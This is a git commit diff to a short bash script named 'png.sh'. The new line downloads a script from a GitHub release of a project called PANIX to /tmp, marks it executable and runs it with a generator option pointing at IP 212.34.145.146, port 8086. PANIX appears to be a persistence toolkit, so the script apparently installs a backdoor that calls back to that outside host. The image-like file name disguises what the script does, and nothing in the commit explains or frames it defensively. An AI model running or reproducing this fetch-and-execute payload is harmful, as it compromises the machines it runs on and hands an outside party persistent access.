4ece2bae197ed7686f8900211add7d4f315c5a68
h-moody <73345535+h-moody@users.noreply.github.com>
2024-12-10 20:47:25 +0300

    Update png.sh

--- png.sh
+++ png.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-/bin/bash -c 'curl -sL https://github.com/Aegrah/PANIX/releases/download/panix-v2.0.0/panix.sh' && /bin/chmod +x panix.sh && ./panix.sh --generator --ip 212.34.145.146 --port 8086
+/bin/bash -c 'curl -sL https://github.com/Aegrah/PANIX/releases/download/panix-v2.0.0/panix.sh -o /tmp/pan.sh' && /bin/chmod +x /tmp/pan.sh && /tmp/pan.sh --generator --ip 212.34.145.146 --port 8086
